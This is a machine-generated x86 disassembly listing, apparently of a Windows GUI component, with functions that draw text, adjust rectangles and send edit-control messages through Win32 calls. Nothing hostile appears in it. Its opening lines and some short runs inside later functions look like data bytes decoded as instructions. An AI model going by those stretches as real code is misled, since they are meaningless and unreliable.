imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
inc ebx
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax + 0x4208000d ] al
outsb
lodsb [ esi ]
xlat
inc ebx
add [ edi + edx * 8 ] dh
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ edi + eax - 0x222fffbc ] al
inc esp
add ah ch
loop r-xdata
insb
jae r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
jmp [ eax + ecx + 0x44 ]
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
dec eax
and eax [ eax + eax - 0x7c ]
outsd
inc esp
add [ edi + ebp * 2 - 0x707fffbc ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
xor eax 0xb2e40040
inc esp
add [ ebp - 0x2853ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x43
add [ edx + 0x180043d8 ] dh
add al [ eax ]
add ah ch
aad 0x43
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
popad
add [ eax ] al
add [ edi + ebx * 4 + 0x3c0041 ] ah
add dh bh
clc
bound eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov al [ 0x61004423 ]
sub_43e8cd
add [ eax ] al
add [ ebx + 0x53000408 ] ch
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4497d8
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_427c70
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_427bcc
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43e940
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43ece2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_427c70
call sub_43a564
call sub_43a644
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_427bcc
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_446f84
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_41a018
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41a018
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x54 ]
call sub_4043e0
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x58 ]
call sub_4045e0
push eax
mov eax edi
call sub_427d50
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_41a018
mov eax ebx
mov si 0xffc8
call sub_40358c
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_427608
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_427608
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4279e8
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_427608
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_427d50
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ece9
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_404144
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x60 ]
call sub_40482c
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_404144
retn
mov eax ebx
mov si 0xffc8
call sub_40358c
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4279e8
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_446f84
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_427bb0
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_41a018
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_41a018
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404978
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_427d50
push eax
call sub_43a564
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43a7ac
jmp r-xdata
call sub_43a564
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43a810
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_427d50
push eax
call sub_43a564
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43a700
push 0x0
mov eax edi
call sub_427d50
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_446f84
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_449264
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x80 ]
call sub_4043e0
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x84 ]
call sub_4045e0
push eax
mov eax edi
call sub_427d50
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_427608
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x88 ]
call sub_4043e0
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x8c ]
call sub_4045e0
push eax
mov eax edi
call sub_427d50
push eax
call DrawTextA
sub_43ecf3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ed6e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45dd2c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44cbf0
mov eax ebx
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov eax ebx
call sub_44dd04
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ed75
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_43edc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e9cc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_446740
mov edx 0x11
mov eax esi
call sub_446764
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43a564
call sub_43a644
test al al
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43ee6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43efc2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_449264
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_427c70
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043e8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x160 ]
call sub_427d50
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_426e3c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x160 ]
call sub_427d50
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_426e3c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x160 ]
call sub_427d50
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43efc9
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_43efd3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43f1fc
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_427724
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_427608
xor edx edx
mov eax [ esi + 0x14 ]
call sub_427724
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4279ac
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_40358c
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_40358c
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43f0f4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_427dd0
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_40358c
xor edx edx
mov eax [ edi + 0x160 ]
call sub_427dd0
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_40358c
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_443d64
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_43f238
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43f1fc
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f298
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_40358c
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f2c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_446454
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_43f324
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f3b1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f3b8
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45dd2c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43f408
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449498
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_446740
mov edx 0x19
mov eax esi
call sub_446764
mov dl 0x1
mov eax esi
call sub_44d9d8
xor edx edx
mov eax esi
call sub_447148
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_43fb18
mov eax esi
test bl bl
je r-xdata
sub_43f4b0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43f530
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_43f574
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_44daa8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
test eax eax
setne bl
sub_43f5ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44daa8
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43f5e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f661
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f668
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov edx eax
mov eax ebx
call sub_446f60
sub_43f66c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_44daa8
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
sub_43f6a8
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_43f6cc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43f6ec
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_43f71c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f7b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_446ef8
inc eax
call sub_408dfc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f842
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408e10
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_446f08
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408c74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f849
mov eax [ ebp - 0xc ]
call sub_408e48
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_43f854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404210
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_446ef8
inc eax
call sub_408dfc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f8e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408e10
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f08
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4029b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408e48
retn
sub_43f8f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a5f8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44a524
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_43f9a9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_44a8f4
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_44a8f4
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_43fa1c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_43fa5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44a724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fa62
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_43fa62
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_43f5ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fadc
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SendMessageA
sub_43fadc
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_43fb18
pop ebx
retn
sub_43fb18
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_426e50
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_446764
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_43fbe4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_44b2e4
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_43fc1c
push esi
mov esi eax
mov eax esi
